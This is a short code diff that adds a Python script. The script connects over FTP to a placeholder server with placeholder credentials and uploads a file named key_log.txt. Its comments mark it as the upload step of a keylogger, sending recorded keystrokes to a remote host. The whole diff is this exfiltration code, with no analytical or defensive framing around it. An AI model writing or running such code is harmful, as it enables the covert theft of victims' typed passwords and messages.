@@ -1,0 +1,6 @@
+import ftplib
+session = ftplib.FTP('server.address.com','USERNAME','PASSWORD') #Configure to correct Host server
+file = open('key_log.txt','rb')                  # file to send #Configure correct file
+session.storbinary('STOR key_log.txt', file)     # send the file # #added key_log
+file.close()                                    # close file and FTP
+session.quit()
